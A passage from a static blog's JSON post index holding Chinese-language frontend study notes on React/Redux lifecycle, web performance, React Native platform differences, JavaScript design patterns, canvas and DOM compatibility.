reducer这里输出看看action有什么\n刚开始是这样的，应该是combineReducer的时候先占位，但是还没有装入</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/9.png\" alt=\"Aaron Swartz\"></p>\n<p>登录成功后两处输出是一样的， </p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/10.png\" alt=\"Aaron Swartz\"></p>\n<p>Action</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/11.jpg\" alt=\"Aaron Swartz\"></p>\n<p>15\n<img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/12.png\" alt=\"Aaron Swartz\"></p>\n<p>验证成功，把reducer函数名称改一下</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/13.png\" alt=\"Aaron Swartz\">\n<img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/14.png\" alt=\"Aaron Swartz\"></p>\n<p>16.高阶组件是一个函数（而不是组件）,原项目里面的GetNextPage.jx相当于IndexList的高阶组件，用到了get-next-page插件</p>\n<p><a href=\"https://segmentfault.com/n/1330000011305070\">用于下拉自动加载数据get-next-page插件</a></p>\n<p>17.组件必须大写字母开头，不然会当做html的标签</p>\n<p>18.\nthis.refs.dataload</p>\n<pre><code>&lt;div ref=&quot;dataload&quot;&gt;</code></pre><p>19.生命周期知识点</p>\n<p>Mounting</p>\n<p>These methods are called when an instance of a component is being created and inserted into the DOM:</p>\n<pre><code>•    constructor()\n•    componentWillMount()\n•    render()\n•    componentDidMount()</code></pre><p>Updating</p>\n<p>These methods are called when a component is being re-rendered:</p>\n<pre><code>•    componentWillReceiveProps()\n•    shouldComponentUpdate()\n•    componentWillUpdate()\n•    render()\n•    componentDidUpdate()</code></pre><p>Unmounting</p>\n<p>This method is called when a component is being removed from the DOM:</p>\n<pre><code>•    componentWillUnmount()</code></pre><p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/15.png\" alt=\"Aaron Swartz\"></p>\n<p>打开localhost的时候，/home初始化，因为调用了两次setState,所以调用了两次componentWillReceiveProps, \nProp改变会自动触发componentWillReceiveProps, shouldComponentUpdate ,componentWillUpdate ,render,componentDidUpdate,每一次改变prop就会触发这些\nState改变需要使用setState方法设置，然后会自动调用shouldComponentUpdate,componentWillUpdate,render, componentDidUpdate()。跟Prop改变不同的是，state改变可能不会立即触发，他会和其他合并之后再触发</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/16.png\" alt=\"Aaron Swartz\"></p>\n<p>原因</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/17.png\" alt=\"Aaron Swartz\"></p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/18.png\" alt=\"Aaron Swartz\"></p>\n<p>下拉的时候同样是两次</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/19.png\" alt=\"Aaron Swartz\"></p>\n<p>接着切换为tab=good</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/20.png\" alt=\"Aaron Swartz\"></p>\n<p>这里多了一次是URL改变也触发了一次setState</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/21.png\" alt=\"Aaron Swartz\"></p>\n<p>tab=good的时候下拉</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/22.png\" alt=\"Aaron Swartz\"></p>\n<p>点击“发表”</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/23.png\" alt=\"Aaron Swartz\"></p>\n<p>再回来“首页”，</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/24.png\" alt=\"Aaron Swartz\"></p>\n<p>但是什么原理导致HomeContainer的prop改变？？ 每次调用action就会引起props改变，这是redux内部自动实现的</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/25.png\" alt=\"Aaron Swartz\"></p>\n<p>17.super()和super(props)的区别在于能否在子类prototype的constructor中调用this,props</p>\n<p>18.首页用一个数组存储每个tab之前浏览的情况,但是这里有个情况，/home和/home?tab=all区别存储了</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/26.png\" alt=\"Aaron Swartz\"></p>\n<p>19.获取参数方式</p>\n<p><a href=\"http://localhost:4000/home?tab=good\">http://localhost:4000/home?tab=good</a></p>\n<pre><code>queryString.parse(props.location.search).tab</code></pre><p><a href=\"http://localhost:4000/topic/5555\">http://localhost:4000/topic/5555</a> </p>\n<pre><code>&lt;Route path=&quot;users&quot; component={Users}&gt;\n    &lt;Route path=&quot;/user/:userId&quot; component={User}/&gt;\n&lt;/Route&gt;\n&lt;Link to={/user/${user.id}}&gt;{user.name}&lt;/Link&gt;\n    props.match.params. userId</code></pre><p>20.props.dangerouslySetInnerHTML must be in the form {__html: ...}</p>\n<pre><code>dangerouslySetInnerHTML=\\{\\{__html:content\\}\\}</code></pre><p>21.前往某个页面</p>\n<pre><code>this.context.router.history.push({\n                pathname: &#39;/topic/&#39; + res.topic_id\n            });</code></pre><p>22.任何想访问context里面的属性的组件都必须显式的指定一个contextTypes 的属性。如果没有指定改属性，那么组件通过 this.context 访问属性将会出错</p>\n<p>23.process.cwd()当前工作目录（Current Work Directory）</p>\n<p>24.this.context.router.push(&#39;/&#39;) ，注：这个写法会把跳转载入浏览器历史，若不想留下历史记录则可以 this.context.router.replace(&#39;/&#39;) </p>\n<p>最后我把源码里面的redux形式改成这样connect(mapStateToProps,mapDispatchToProps)(SignIn)这种形式，在网上看好像大家也比较接受这种形式</p>\n<pre><code>const mapStateToProps = (state) =&gt; {\n    return {\n    User: state.User\n    }\n}\n\nconst mapDispatchToProps = (dispatch) =&gt; {\n    return {\n        signinSuccess: (user) =&gt; {\n            dispatch(signinSuccess(user))\n        }\n    }\n}\n\nexport default connect(mapStateToProps,mapDispatchToProps)(SignIn); //连接redux</code></pre><h3 id=\"待解决（已解决）\">待解决（已解决）</h3>\n<p>npm run build的时候出错</p>\n<blockquote>\n<p>Failed to minify the code from this file: ./~/get-next-page/dist/get-next-page.js:59 Read more here:      <a href=\"http://bit.ly/2tRViJ9\">http://bit.ly/2tRViJ9</a> </p>\n</blockquote>\n<p> 原项目是自己写的webpack配置文件。我全是create-react-app自动生成的，不想改,网上查到这段话</p>\n<pre><code>npm run build fails to minify\n\nYou may occasionally find a package you depend on needs compiled or ships code for a non-browser environment.\nThis is considered poor practice in the ecosystem and does not have an escape hatch in Create React App.\n\nTo resolve this:\n\nOpen an issue on the dependency&#39;s issue tracker and ask that the package be published pre-compiled (retaining ES6 Modules).\nFork the package and publish a corrected version yourself.\nIf the dependency is small enough, copy it to your src/ folder and treat it as application code.\nSomething Missing?\n</code></pre><p>我这里用第三种方法，把get-netx-page.js放到/src/lib里面，相应的地方再改改，就可以了，npm run build之后就会生成build文件夹</p>\n<h3 id=\"部署\">部署</h3>\n<p>参考 <a href=\"https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#deployment\">部署方法</a></p>\n<pre><code>&gt;npm install -g serve\n&gt;serve -s build\n\n打开localhost:5000 ,成功</code></pre><h3 id=\"疑问：\">疑问：</h3>\n<p>通过createHistory()方法生成的history和react-router中的history有什么区别？？？</p>\n","index":6},{"filePath":"post\\2018\\1\\30-web-full-stack-study.md","htmlPath":"/post/2018/1/30-web-full-stack-study.html","name":"30-web-full-stack-study.md","type":"md","layout":"post","title":"读《Web 全栈工程师的自我修养》","date":"2018/1/30","categories":"Reading","tags":"读书笔记","html":"<h2 id=\"减少同一域名下的http请求数\">减少同一域名下的HTTP请求数</h2>\n<p>1、把静态资源放在单独的非主域名。这样可以增加浏览器并发连接数，而且减少HTTP请求中携带的不必要的cookie数据（cookie的作用域是整个域名）</p>\n<p>2、合并同一域名下的资源。比如，合并CSS文件，将图片组合为CSS贴图（sprite）</p>\n<p>3、省掉不必要的HTTP请求，可以 内嵌小型css/js,设置缓存，减少重定向等</p>\n<h2 id=\"减少每一个资源的体积\">减少每一个资源的体积</h2>\n<p>1、    选择合适的图片格式，就能用更小的体积，达到更好的显示效果。如果图片颜色数较多就使用JPG格式，较少就使用PNG格式。如果能够通过服务器端判断浏览器支持WebP,那么久使用WebP格式和SVG格式</p>\n<p>2、    对于比较大的文本资源，必须开启服务器端的gzip压缩。因为gzip对于含有重复“单词”的文本文件，压缩率比较高，能够有效提高传输过程。Gzip对文本资源非常有效，对图片资源则没那么大的压缩率</p>\n<p>3、    压缩源码和图片</p>\n<p>Js文件源代码可以采用混淆压缩 的方式</p>\n<p>Css文件源代码进行普通压缩</p>\n<p>JPG图片可以根据具体质量压缩为50%到70%</p>\n<p>PNG可以使用一些开源压缩软件来压缩，比图24色变为8色、去掉一些PNG格式信息</p>\n<h2 id=\"使用cdn\">使用CDN</h2>\n<p>可以增加并发下载量，还能与其他网站共享缓存</p>\n<h2 id=\"推荐的浏览器缓存设置的最佳实践\">推荐的浏览器缓存设置的最佳实践</h2>\n<p>1、    对于动态生成的HTML页面使用HTTPS头：Cache-Control：no-cache</p>\n<p>2、    对于静态HTML页面使用HTTPS头：Last-Modified</p>\n<p>3、    其他所有的文件类型都设置Expires头，并且在文件内容有所修改的时候修改query string。</p>\n<p>为了避免出现运营商劫持文件的情况，使用更加强硬的方法：修改文件名，而不是修改query string。用户的宽带运营商为了提高速度，可能会在自己的某个节点服务器上缓存你的文件，但是如果query string更新了，运营商仍然可能那自己节点的缓存发给你。（根据HTTP规范，如果修改了请求资源的Query string,就应该被视为一个新的文件）\n这些都是服务器对每个资源的响应头里设置的</p>\n<h2 id=\"版本控制最佳实践\">版本控制最佳实践</h2>\n<p>1、    鼓励频繁提交，不要等到代码没问题了再提交</p>\n<p>2、    确定分支流程。基本上所有的特性和较大的bug都应该使用分支来修改</p>\n<p>3、    定义主干原则，并且坚守它。我们的团队的主干原则是“主干对应的代码必须是可以发布并且不会产生bug的”</p>\n<p>4、    不要把逻辑的修改和代码格式化操作混在一起提交</p>\n<p>5、    不相干的代码分开提交，也就是说不要在一次提交里面修复两个bug</p>\n<p>6、    保持代码库的“干净”</p>\n<h2 id=\"设计原则\">设计原则</h2>\n<p>1、三次法则（rule of three）允许按需直接赋值粘贴代码一次，如果相同的代码重复出现三次及三次以上，将其提取处理做成一个子程序</p>\n<p>2、WET（wwrite everything twice）</p>\n<p>3、DRY（don’t repeat youselft）</p>\n<p>4、惯例优先于设置</p>\n<p>5、KISS原则，keep it simple,stupid</p>\n<p>6、最少知道原则</p>\n<h2 id=\"在别的地方看到的图\">在别的地方看到的图</h2>\n<p>性能优化</p>\n<p>{% asset_img performance-optimize.png 性能优化 %}</p>\n<p>图片适配</p>\n<p>{% asset_img pic-adapt.jpg 图片适配 %}</p>\n<p>aria无障碍文本\n{% asset_img aria.png aria %}</p>\n","index":7},{"filePath":"post\\2018\\1\\4-reatnative-android-ios.md","htmlPath":"/post/2018/1/4-reatnative-android-ios.html","name":"4-reatnative-android-ios.md","type":"md","layout":"post","title":"reat-native在Android和IOS平台的区别","date":"2018/1/30","categories":"学习","tags":"读书笔记","html":"<p>读《React-Native跨平台移动应用开发第2版》\n<img src=\"/images/book/React-Native.jpg\" alt=\"cover\"></p>\n<ul>\n<li><p>在Android平台上，TextInput组件可以按照字体大小来自动设置高度\nIOS上必须要在样式上设置高度，否则不会显示\nSolution: TextInput组件设置高度</p>\n</li>\n<li><p>Iphone手机没有返回键，需要时iphone应用通常在屏幕左上角放置一个返回按钮</p>\n</li>\n<li><p>在Android上，Alert API实现的弹出选择框最多只能有三个选项。按下返回键会让弹出框消失，并且不会触发Alert API提供的回调函数。\nIOS上，选项没有个数限制。选项上设置 style:’cancel’只对IOS有效，使选项排列到最下方</p>\n</li>\n<li><p>overflow只对IOS有效\n默认为hidden</p>\n</li>\n<li><p>elevation:数值 只有android平台特有，产生组件浮现在手机屏幕上的视觉效果</p>\n</li>\n<li><p>renderHarwareTextureAndroid,needsOffscreenAlphaCompositing  android特有，与动画效果有关\nshouldRasterizeIOS   IOS特有，与动画效果有关</p>\n</li>\n<li><p>accessibilityComponentType,accessibilityLiveRegion,importantForAccessibility为android特有\naccessibilityTraits,onAccessibilityTap为IOS特有\naccessible,accessibilityLabel为android和IOS共有</p>\n</li>\n<li><p>IOS支持GIF和WebP格式\nAndroid默认不支持这个两种格式，需要在android/app/build.gradle添加设置\nRN本身还不支持SVG</p>\n</li>\n<li><p>苹果要求苹果移动应用开发者在应用中不能使用HTTP协议，转为使用HTTPS协议，所以在IOS工程中，使用的网络图片等资源必须是https。可以通过设置改变。</p>\n</li>\n<li><p>resizeMode取值为repeat只对IOS有效</p>\n</li>\n<li><p>tintColor 为IOS特有，可以让图片中的非透明像素部分有一种被染色的效果\noverlayColor为android特有，强行将需要圆角的部分使用指定颜色填充，从而实现圆角效果</p>\n</li>\n<li><p>TouchableNativeFeedback为android专用组件</p>\n</li>\n<li><p>textAlign:justify只在IOS下有效，在Android下等价于left</p>\n</li>\n<li><p>ios独有的样式\nfontVariant,letterSpacing,writingDirection,textDecorationStyle,textDecorationColor，\nadjustsFontSizeToFit,allowFontScaling,minimumFontScale,suppressHighlighting\nandroid独有\nincludeFontPadding,selectionColor,textAlignVertical,textBreakStrategy\nellipizeMode:head/middle/tail只有IOS支持， android所有取值和clip一样。ellipizeMode需要和numberOfLines配合使用</p>\n</li>\n<li><p>TextInput、Text组件设置borderWidth在android无效</p>\n</li>\n<li><p>TextInput组件alignItems:’center’在IOS上无效</p>\n</li>\n<li><p>IOS上TextInput组件没有设置height会不显示</p>\n</li>\n<li><p>Ios支持keyboardWillHide，android不支持</p>\n</li>\n</ul>\n","index":8},{"filePath":"post\\2018\\10\\design-pattern.md","htmlPath":"/post/2018/10/design-pattern.html","name":"design-pattern.md","type":"md","title":"读《Learning Javascript Design Patterns》 -Addy Osmani","date":"2018/10/18","categories":"Reading","tags":"读书笔记","html":"<h1 id=\"《learning-javascript-design-patterns》--addy-osmani-人民邮电出版社\">《Learning Javascript Design Patterns》 -Addy Osmani 人民邮电出版社</h1>\n<h2 id=\"创建对象的三种方法\">创建对象的三种方法</h2>\n<pre><code class=\"language-javascipt\">obj={};\nobj=new Object();\nobj=Object.create(null)</code></pre>\n<h2 id=\"设计模式类别\">设计模式类别</h2>\n<h3 id=\"创建型\">创建型</h3>\n<ul>\n<li>Constructor</li>\n<li><a href=\"#Prototype.js\">Prototype</a></li>\n<li><a href=\"#Singleton.js\">Singleton</a></li>\n<li><a href=\"#Factory.js\">Factory</a></li>\n<li><a href=\"#Abstract-Factory.js\">Abstarct</a></li>\n<li>Builder<h3 id=\"机构型\">机构型</h3>\n</li>\n<li>Decorator</li>\n<li>Facade : 和<a href=\"#Module.js\">Module</a>类似</li>\n<li>Flyweight</li>\n<li>Adapter</li>\n<li>Proxy<h3 id=\"行为型\">行为型</h3>\n</li>\n<li>Iterator</li>\n<li><a href=\"https://github.com/LRY1994/nice-code/blob/master/designPattern/Mediator.js\">Mediator</a></li>\n<li><a href=\"#Observer.js\">Observer</a></li>\n<li><a href=\"#Publich-Subscribe.js\">Publich-Subscribe</a></li>\n<li>Visitor</li>\n</ul>\n<p>Observer和Publich-Subscribe的区别\n{%asset_img observer.png%}\n{%asset_img publish-suscriber.png%}</p>\n<h1 id=\"prototypejs\">Prototype.js</h1>\n<pre><code class=\"language-js\">//Object.create\nvar vehicle = {\n    getModel:function(){\n        console.log(this.model);\n    }\n};\nvar car = Object.create(vehicle,{\n    &quot;id&quot;:{\n        value:1,\n        enumerable:true\n    },\n    &quot;model&quot;:{\n        value:&quot;Ford&quot;,\n        enumerable:true\n    }\n});\n\n//function F(){}\nvar beget = (function({\n    function F(){};\n    return function(_proto_){\n        F.prototype=_proto_;\n        return new F();\n    }\n}))();\n\nvar car =beget(vehicle);</code></pre>\n<h1 id=\"singletonjs\">Singleton.js</h1>\n<pre><code class=\"language-js\">//Singleton单例模式\nvar singleTon = (function(){\n    var instance;\n    function init(){\n        function privateMethod(){}\n        var privateVar = &#39;privateVar&#39;;\n        return {\n            publicMethod :function(){},\n            publicVar : &#39;publicVar&#39;\n        }\n    }\n    return{\n        getInstance:function(){\n            if(!instance){ instance = init(); }\n            return instance;\n        }\n    }\n})\n\nvar singleTon2 = (function(){\n    var instance;\n    var _static ={}\n    function singleTon(opt){//构造函数\n        options = opt ||{};\n        this.point = opt.point;\n        this.privateMethod = function(){}\n    }\n    var _satic = {\n        name :&#39;singleTon&#39;,\n        getInstance:function(opt){\n            if(!instance){ instance = new singleTon(opt); }\n            return instance;\n        }\n    };\n    return _static;\n})\n\nsingleTonTest = singleTon2.getInstance({point:5})</code></pre>\n<h1 id=\"factoryjs\">Factory.js</h1>\n<pre><code class=\"language-js\">//Factory.js\nfunction Car(options){\n    this.doors = options.doors ||4;\n    this,color = options.color||&#39;silver&#39;;\n}\nfunction Trunk(options){\n    this.weelSize=options.weelSize||&#39;large&#39;;\n    this.color =options.color||&#39;blue&#39;;\n}\nfunction VehicleFactory(){}\nVehicleFactory.prototype.vehicleClass = Car;\nVehicleFactory.prototype.createVehicle = function(options){\n    if(options.vehicleTtype == &#39;car&#39;){\n        this.vehicleClass=Car;\n    }else{\n        this.vehicleClass = Truck;\n    }\n    return new this.vehicleClass(options);\n}\n//use\nvar carFactory=new VehicleFactory();\nvar car=carFactory.createVehicle({\n    vehicleTtype:&#39;car&#39;,\n    doors:6,\n    color:&#39;yellow&#39;\n})\nvar trunk = carFactory.createVehicle({\n    vehicleTtype:&#39;trunk&#39;,\n    color:&#39;red&#39;,\n    weelSize:&#39;small&#39;\n})</code></pre>\n<h1 id=\"abstract-factoryjs\">Abstract-Factory.js</h1>\n<pre><code class=\"language-js\">//Factory.js\nfunction Car(options){\n    this.doors = options.doors ||4;\n    this.color = options.color||&#39;silver&#39;;\n}\nfunction Trunk(options){\n    this.weelSize=options.weelSize||&#39;large&#39;;\n    this.color =options.color||&#39;blue&#39;;\n}\nvar AbstractFactory=(function(){\n    var types={};\n    return{\n        getVehicle:function(type,options){\n            var Vehicle = types[type];\n            return Vehicle? new Vehicle(options):null\n        },\n        registerVehicle:function(ty,vehicle){//这个必须有\n            var proto = vehicle.prototype;\n            if(proto.drive&amp;&amp;proto.breakDown){\n                types[type]=vehicle\n            }\n            return AbstractFactory;\n        }\n\n    }\n})();\n\n//use\nAbstractFactory.registerVehicle(&quot;car&quot;,Car);\nAbstractFactory.registerVehicle(&quot;truck&quot;,Trunk);\nvar car = AbstractFactory.getVehicle(&quot;car&quot;,{\n    door:6,\n    color:&#39;red&#39;\n});\nvar trunk = AbstractFactory.getVehicle(&quot;trunk&quot;,{\n    weelSize:&#39;small&#39;,\n    color:&#39;red&#39;\n})</code></pre>\n<h1 id=\"observerjs\">Observer.js</h1>\n<pre><code class=\"language-js\">//Observer \n{//观察者\nfunction Observer()\n    this.observerList = [];\n}\nObserver.prototype.get = function(index){\n    return this.observerList[index]\n}\nObserver.prototype.add = function(ConcreteOberver){\n    return this.observerList.push(ConcreteOberver)\n}\n//目标\nfunction Subject(){\n    this.observers=new Observer();\n}\n//具体观察者注册到目标\nSubject.prototype.add = function(ConcreteOberver){\n    this.observers.add(ConcreteOberver)\n}\n//目标发生变化，调度观察者\nSubject.prototype.notify = function(context){\n    for(let i=0;i&lt;this.observers.count();i++){\n        this.observers.get(i).update(context)\n    }\n}\n//具体观察者\nfunction ConcreteOberver(){\n    this.update = function(){}\n}</code></pre>\n<h1 id=\"publich-subscribejs\">Publich-Subscribe.js</h1>\n<pre><code class=\"language-js\">//Publish/Subscribe\n\nvar pubsub={};//调度中心\n(function(q){\n    var topics={},subUid = -1;\n    q.publish = function(topic,args){\n        if(!topics[topic]) return false;\n        var subscribers = topics [ topic];\n        var len = subscribers? subscribers.length:0;\n        while(len -- ){\n            subscribers[len].func(topic,args)\n        }\n    };\n    q.subscribe = function(topic,func){\n        if(!topics[topic]) topics[topic]=[];\n        var token = (++subUid).toString();\n        topics[topic].push({token :token,func:func});\n        return token;\n    };\n    q.unsunscribe = function(token){\n        for(var m in topics){\n            if(topics[m]){\n                for(let i=0,j=topics[m].length;i&lt;j;i++){\n                    if(topics[m][i].token ==token){\n                        topics[m].splice(i,1);\n                        return token;\n                    }\n                }\n            }\n        }\n        return this;\n    }\n})(pubsub)</code></pre>\n","index":9},{"filePath":"post\\2018\\11\\canvas.md","htmlPath":"/post/2018/11/canvas.html","name":"canvas.md","type":"md","title":"canvas","date":"2018/11/18","categories":"Experience","tags":"日常记录","html":"<p>canvas默认是宽300px,高150px,即<code>&lt;canvas width=&quot;300&quot; height=&quot;150&quot;&gt;</code>\n当像这样设置的时候<code>&lt;canvas width=&quot;300&quot; height=&quot;150&quot;&gt;</code>，会同时修改 <strong>元素本身大小</strong>和 <strong>元素绘图表面大小</strong>\n通过css设置的时候，只会改变 <strong>元素本身大小</strong></p>\n<p>如果基于canvas的应用程序要支持IE6,IE7,IE8,游两个选择：explorecanvas\\Google Chrome Frame</p>\n<p>希望执行几行特定的代码时才开始分析，在执行完之后就停止性能分析，可用console.profile()和console.profileEnd()</p>\n<p>把窗口坐标转换成相对于canvas的位置</p>\n<pre><code class=\"language-js\">function windowToCanvas(canvas,clientX,clientY){\n    var bbox = canvas.getBoundingClientRect();\n    return{\n        x:(clientX-bbox.width)*(canvas.width/bbox.width)\n        y:(clientY-bbox.height)*(canvas.height/bbox.height)\n    }\n} </code></pre>\n<p>canvas是一个不可获取焦点的元素，所以不能直接在元素上绑定键盘事件，应该在docunmet或window上绑定键盘事件</p>\n<p>浏览器只会在产生可打印字符的时候才触发keypress事件。用<code>var key =String.fromCharCode(event.which)</code></p>\n<p>打印canvas内容：<code>toDataURL()</code>  <code>toBlob()</code></p>\n","index":10},{"filePath":"post\\2018\\2\\26-dom-compaticity.md","htmlPath":"/post/2018/2/26-dom-compaticity.html","name":"26-dom-compaticity.md","type":"md","layout":"post","title":"原生DOM兼容特性总结","date":"2018/2/26","categories":"Experience","tags":"专题探究","html":"<p>浏览器主要也就是IE有点独特，所以把IE重点区分开</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th align=\"left\">主流</th>\n<th align=\"left\">IE</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>内文本</td>\n<td align=\"left\">innerText</td>\n<td align=\"left\">textContent</td>\n</tr>\n<tr>\n<td>请求对象</td>\n<td align=\"left\">XMLHttpRequest</td>\n<td align=\"left\">ActiveXObject<br>[&quot;MSXML2.XMLHttp.6.0&quot;,&quot;MSXML2.XMLHttp.3.0&quot;,&quot;MSXML2.XMLHttp&quot;]</td>\n</tr>\n<tr>\n<td>监听事件添加</td>\n<td align=\"left\">addEventListener(DOM2),<br> [&#39;on&#39;+eventName](DOM0)</td>\n<td align=\"left\">attachEvent</td>\n</tr>\n<tr>\n<td>监听事件移除</td>\n<td align=\"left\">removeEventListener(DOM2),<br>[&#39;on&#39;+eventName]=null(DOM0)</td>\n<td align=\"left\">detachEvent</td>\n</tr>\n<tr>\n<td>事件对象</td>\n<td align=\"left\">function(e) e</td>\n<td align=\"left\">window.event(IE7之前)</td>\n</tr>\n<tr>\n<td>阻止默认事件</td>\n<td align=\"left\">preventDefault</td>\n<td align=\"left\">e.returnValue=false</td>\n</tr>\n<tr>\n<td>阻止冒泡</td>\n<td align=\"left\">stopPropagation</td>\n<td align=\"left\">e.cancelBubble=true</td>\n</tr>\n<tr>\n<td>键盘事件键盘编码</td>\n<td align=\"left\">e.charCode</td>\n<td align=\"left\">e.keyCode</td>\n</tr>\n<tr>\n<td>获取剪贴板的文本</td>\n<td align=\"left\">e.clipboardData</td>\n<td align=\"left\">window.clipboardData</td>\n</tr>\n<tr>\n<td>设置剪贴板文本</td>\n<td align=\"left\">e.clipboardData.setData(&quot;text/plain&quot;,value);</td>\n<td align=\"left\">window.clipboardData.setData(&quot;text&quot;,value);</td>\n</tr>\n<tr>\n<td>触发事件的元素</td>\n<td align=\"left\">e.target</td>\n<td align=\"left\">e.srcElement</td>\n</tr>\n<tr>\n<td>获取样式</td>\n<td align=\"left\">getComputedStyle(obj,false)[attr];(Firefox浏览器)<br> obj.style.attr(只对filter,opacity等有效)<br>obj.style[attr]</td>\n<td align=\"left\">obj.currentStyle[attr];</td>\n</tr>\n<tr>\n<td>窗口左边的位置</td>\n<td align=\"left\">window.screenLeft</td>\n<td align=\"left\">window.screenX</td>\n</tr>\n<tr>\n<td>页面视口大小</td>\n<td align=\"left\">window.innerHeight</td>\n<td align=\"left\">if(document.compatMode==&quot;CSS1Compat&quot;)window.documentElement.clientHeight;<br> if(document.compatMode==&quot;BackCompat&quot;)window.body.clientHeight<br></td>\n</tr>\n<tr>\n<td>获取元素</td>\n<td align=\"left\">document.getElementById(id);</td>\n<td align=\"left\">document.all[id];(IE5)</td>\n</tr>\n<tr>\n<td>返回指定的属性</td>\n<td align=\"left\">ele.getAttribute(attr)</td>\n<td align=\"left\">ele.attribute[attr]</td>\n</tr>\n<tr>\n<td>ele是否存在指定属性 attr</td>\n<td align=\"left\">ele.hasAttribute(attr)</td>\n<td align=\"left\">ele.attributes[attr].specified;</td>\n</tr>\n<tr>\n<td>鼠标滚动，正数表示向上滚动</td>\n<td align=\"left\">function getWheelDelta(e){<br>if(e.wheelData){<br>return (client.engine.opera&amp;&amp;client.engine.opera&lt;9.5)?<br>-e.wheelData:e.wheelData;<br>}else {<br>return -e.detail*40;//firefox<br>}<br>}</td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td>提取选中的文本</td>\n<td align=\"left\">textbox.value.subString(textbox.selectionStart,textbox.selectionEnd);</td>\n<td align=\"left\">document.selection.createRange().text;<br>(IE8之前没有selectionStart，selectionEnd属性</td>\n</tr>\n<tr>\n<td>设置文本选中</td>\n<td align=\"left\">textbox.setSelectionRange(startIndex,stopIndex);</td>\n<td align=\"left\">var range=textbox.createTextRange();<br>range.collapse(true);<br>range.moveStart(&quot;character&quot;,0);<br>range.moveEnd(&quot;character&quot;,stopIndex-startIndex);<br>range.select()</td>\n</tr>\n</tbody></table>\n<p>下面是积累下来的一些兼容函数，可以当做模板用</p>\n<ul>\n<li><a href=\"#%E6%B7%BB%E5%8A%A0%E5%A4%9A%E4%B8%AAonload%E4%BA%8B%E4%BB%B6\">添加多个onload事件</a></li>\n<li><a href=\"#%E5%A4%84%E7%90%86ActiveXObject/XMLHttpRequest%E9%97%AE%E9%A2%98\">处理ActiveXObject/XMLHttpRequest问题</a></li>\n<li><a href=\"#%E8%AF%B7%E6%B1%82%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7%E5%92%8C%E6%96%B9%E6%B3%95%E8%AE%BE%E7%BD%AE\">请求对象的属性和方法设置</a></li>\n<li><a href=\"#%E5%8F%91%E9%80%81%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE\">发送表单数据</a></li>\n<li><a href=\"#%E8%B7%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84CORS\">跨浏览器的CORS</a></li>\n<li><a href=\"#%E8%B7%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F\">跨浏览器事件处理程序</a></li>\n<li><a href=\"#%E5%A4%84%E7%90%86target/srcelemnt%E9%97%AE%E9%A2%98%EF%BC%8C%E4%BB%A3%E6%9B%BFthis\">处理target/srcelemnt问题，代替this</a></li>\n<li><a href=\"#%E5%AE%9E%E7%8E%B0insertAfter\">实现insertAfter</a></li>\n<li><a href=\"#%E7%BB%99element%E5%8A%A0%E4%B8%8A%E7%B1%BB%E5%90%8D\">给element加上类名</a></li>\n<li><a href=\"#%E5%88%A4%E6%96%AD%E6%98%AF%E4%B8%8D%E6%98%AF%E6%95%B0%E7%BB%84\">判断是不是数组</a></li>\n<li><a href=\"#IE10%E4%B9%8B%E5%89%8D%E4%B8%8D%E6%94%AF%E6%8C%81docunment.getElementByClassName\">IE10之前不支持docunment.getElementByClassName</a></li>\n<li><a href=\"#%E8%8E%B7%E5%8F%96css%E6%A0%B7%E5%BC%8F\">获取css样式</a></li>\n<li><a href=\"#%E6%89%8B%E5%86%99%E5%8A%A8%E7%94%BB\">手写动画</a></li>\n<li><a href=\"#%E5%8F%96%E5%BE%97%E7%AA%97%E5%8F%A3%E5%B7%A6%E8%BE%B9%E5%92%8C%E4%B8%8A%E8%BE%B9%E7%9A%84%E4%BD%8D%E7%BD%AE\">取得窗口左边和上边的位置</a></li>\n<li><a href=\"#%E5%8F%96%E5%BE%97%E9%A1%B5%E9%9D%A2%E8%A7%86%E5%8F%A3%E5%A4%A7%E5%B0%8F\">取得页面视口大小</a></li>\n<li><a href=\"#%E6%A3%80%E6%B5%8B%E6%8F%92%E4%BB%B6%E6%96%B9%E6%B3%95\">检测插件方法</a></li>\n<li><a href=\"#%E8%8E%B7%E5%8F%96%E5%85%83%E7%B4%A0\">获取元素</a></li>\n<li><a href=\"#%E6%A3%80%E6%9F%A5%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%9F%90%E4%B8%AA%E7%89%B9%E6%80%A7%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8\">检查对象的某个特性是否存在</a></li>\n<li><a 